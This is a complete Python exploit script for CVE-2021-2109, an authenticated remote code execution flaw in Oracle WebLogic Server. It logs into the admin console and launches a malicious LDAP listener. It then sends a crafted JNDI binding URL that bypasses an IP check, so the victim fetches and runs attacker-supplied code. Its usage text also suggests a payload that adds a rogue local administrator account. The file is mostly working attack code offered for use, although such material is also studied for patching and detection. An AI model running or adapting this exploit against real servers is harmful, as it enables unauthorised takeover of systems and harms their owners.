# Exploit Title: Oracle WebLogic Server 14.1.1.0 - RCE (Authenticated)
# Date: 2021-01-21
# Exploit Author: Photubias
# Vendor Advisory: [1] https://www.oracle.com/security-alerts/cpujan2021.html
# Vendor Homepage: https://www.oracle.com
# Version: WebLogic 10.3.6.0, 12.1.3.0, 12.2.1.3, 12.2.1.4, 14.1.1.0 (fixed in JDKs 6u201, 7u191, 8u182 & 11.0.1)
# Tested on: WebLogic 14.1.1.0 with JDK-8u181 on Windows 10 20H2
# CVE: CVE-2021-2109

#!/usr/bin/env python3
'''
	Copyright 2021 Photubias(c)

        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program.  If not, see <http://www.gnu.org/licenses/>.

        File name CVE-2021-2109.py
        written by tijl[dot]deneut[at]howest[dot]be for www.ic4.be

        This is a native implementation without requirements, written in Python 3.
        Works equally well on Windows as Linux (as MacOS, probably ;-)

        Requires JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
         from https://github.com/welk1n/JNDI-Injection-Exploit
         to be in the same folder
'''
import urllib.request, urllib.parse, http.cookiejar, ssl
import sys, os, optparse, subprocess, threading, time

## Static vars; change at will, but recommend leaving as is
sURL = 'http://192.168.0.100:7001'
iTimeout = 5
oRun = None

## Ignore unsigned certs, if any because WebLogic is default HTTP
ssl._create_default_https_context = ssl._create_unverified_context

class runJar(threading.Thread):
    def __init__(self, sJarFile, sCMD, sAddress):
        self.stdout = []
        self.stderr = ''
        self.cmd = sCMD
        self.addr = sAddress
        self.jarfile = sJarFile
        self.proc = None
        threading.Thread.__init__(self)

    def run(self):
        self.proc = subprocess.Popen(['java', '-jar', self.jarfile, '-C', self.cmd, '-A', self.addr], shell=False, stdout = subprocess.PIPE, stderr = subprocess.PIPE, universal_newlines=True)
        for line in iter(self.proc.stdout.readline, ''): self.stdout.append(line)
        for line in iter(self.proc.stderr.readline, ''): self.stderr += line


def findJNDI():
    sCurDir = os.getcwd()
    sFile = ''
    for file in os.listdir(sCurDir):
        if 'JNDI' in file and '.jar' in file:
            sFile = file
    print('[+] Found and using ' + sFile)
    return sFile

def findJAVA(bVerbose):
    try:
        oProc = subprocess.Popen('java -version', stdout = subprocess.PIPE, stderr = subprocess.STDOUT)
    except:
        exit('[-] Error: java not found, needed to run the JAR file\n    Please make sure to have "java" in your path.')
    sResult = list(oProc.stdout)[0].decode()
    if bVerbose: print('[+] Found Java: ' + sResult)

def checkParams(options, args):
    if args: sHost = args[0]
    else:
        sHost = input('[?] Please enter the URL ['+sURL+'] : ')
        if sHost == '': sHost = sURL
        if sHost[-1:] == '/': sHost = sHost[:-1]
        if not sHost[:4].lower() == 'http': sHost = 'http://' + sHost
    if options.username: sUser = options.username
    else:
        sUser = input('[?] Username [weblogic] : ')
        if sUser == '': sUser = 'weblogic'
    if options.password: sPass = options.password
    else:
        sPass = input('[?] Password [Passw0rd-] : ')
        if sPass == '': sPass = 'Passw0rd-'
    if options.command: sCMD = options.command
    else:
        sCMD = input('[?] Command to run [calc] : ')
        if sCMD == '': sCMD = 'calc'
    if options.listenaddr: sLHOST = options.listenaddr
    else:
        sLHOST = input('[?] Local IP to connect back to [192.168.0.10] : ')
        if sLHOST == '': sLHOST = '192.168.0.10'
    if options.verbose: bVerbose = True
    else: bVerbose = False
    return (sHost, sUser, sPass, sCMD, sLHOST, bVerbose)

def startListener(sJarFile, sCMD, sAddress, bVerbose):
    global oRun
    oRun = runJar(sJarFile, sCMD, sAddress)
    oRun.start()
    print('[!] Starting listener thread and waiting 3 seconds to retrieve the endpoint')
    oRun.join(3)
    if not oRun.stderr == '':
        exit('[-] Error starting Java listener:\n' + oRun.stderr)
    bThisLine=False
    if bVerbose: print('[!] For this to work, make sure your firewall is configured to be reachable on 1389 & 8180')
    for line in oRun.stdout:
        if bThisLine: return line.split('/')[3].replace('\n','')
        if 'JDK 1.8' in line: bThisLine = True

def endIt():
    global oRun
    print('[+] Closing threads')
    if oRun: oRun.proc.terminate()
    exit(0)

def main():
    usage = (
        'usage: %prog [options] URL \n'
        ' Make sure to have "JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar"\n'
        ' in the current working folder\n'
        'Get it here: https://github.com/welk1n/JNDI-Injection-Exploit\n'
        'Only works when hacker is reachable via an IPv4 address\n'
        'Use "whoami" to just verify the vulnerability (OPSEC safe but no output)\n'
        'Example: CVE-2021-2109.py -u weblogic -p Passw0rd -c calc -l 192.168.0.10 http://192.168.0.100:7001\n'
        'Sample payload as admin: cmd /c net user pwned Passw0rd- /add & net localgroup administrators pwned /add'
        )

    parser = optparse.OptionParser(usage=usage)
    parser.add_option('--username', '-u', dest='username')
    parser.add_option('--password', '-p', dest='password')
    parser.add_option('--command', '-c', dest='command')
    parser.add_option('--listen', '-l', dest='listenaddr')
    parser.add_option('--verbose', '-v', dest='verbose', action="store_true", default=False)

    ## Get or ask for the vars
    (options, args) = parser.parse_args()
    (sHost, sUser, sPass, sCMD, sLHOST, bVerbose) = checkParams(options, args)

    ## Verify Java and JAR file
    sJarFile = findJNDI()
    findJAVA(bVerbose)

    ## Keep track of cookies between requests
    cj = http.cookiejar.CookieJar()
    oOpener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    print('[+] Verifying reachability')
    ## Get the cookie
    oRequest = urllib.request.Request(url = sHost + '/console/')
    oResponse = oOpener.open(oRequest, timeout = iTimeout)
    for c in cj:
        if c.name == 'ADMINCONSOLESESSION':
            if bVerbose: print('[+] Got cookie "' + c.value + '"')

    ## Logging in
    lData = {'j_username' : sUser, 'j_password' : sPass, 'j_character_encoding' : 'UTF-8'}
    lHeaders = {'Referer' : sHost + '/console/login/LoginForm.jsp'}
    oRequest = urllib.request.Request(url = sHost + '/console/j_security_check', data = urllib.parse.urlencode(lData).encode(), headers = lHeaders)
    oResponse = oOpener.open(oRequest, timeout = iTimeout)
    sResult = oResponse.read().decode(errors='ignore').split('\r\n')
    bSuccess = True
    for line in sResult:
        if 'Authentication Denied' in line: bSuccess = False
    if bSuccess: print('[+] Succesfully logged in!\n')
    else: exit('[-] Authentication Denied')

    ## Launch the LDAP listener and retrieve the random endpoint value
    sRandom = startListener(sJarFile, sCMD, sLHOST, bVerbose)
    if bVerbose: print('[+] Got Java value: ' + sRandom)

    ## This is the actual vulnerability, retrieve LDAP data from victim which the runs on victim, it bypasses verification because IP is written as "127.0.0;1" instead of "127.0.0.1"
    print('\n[+] Firing exploit now, hold on')
    ##  http://192.168.0.100:7001/console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(-ldap://192.168.0;10:1389/5r5mu7;AdminServer-)
    sConvertedIP = sLHOST.split('.')[0] + '.' + sLHOST.split('.')[1] + '.' + sLHOST.split('.')[2] + ';' + sLHOST.split('.')[3]
    sFullUrl = sHost + r'/console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://' + sConvertedIP + ':1389/' + sRandom + r';AdminServer%22)'
    if bVerbose: print('[!] Using URL ' + sFullUrl)
    oRequest = urllib.request.Request(url = sFullUrl, headers = lHeaders)
    oResponse = oOpener.open(oRequest, timeout = iTimeout)
    time.sleep(5)
    bExploitWorked = False
    for line in oRun.stdout:
        if 'Log a request' in line: bExploitWorked = True
        if 'BypassByEl' in line: print('[-] Exploit failed, wrong SDK on victim')
    if not bExploitWorked: print('[-] Exploit failed, victim likely patched')
    else: print('[+] Victim vulnerable, exploit worked (could be as limited account!)')
    if bVerbose: print(oRun.stderr)
    endIt()

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: endIt()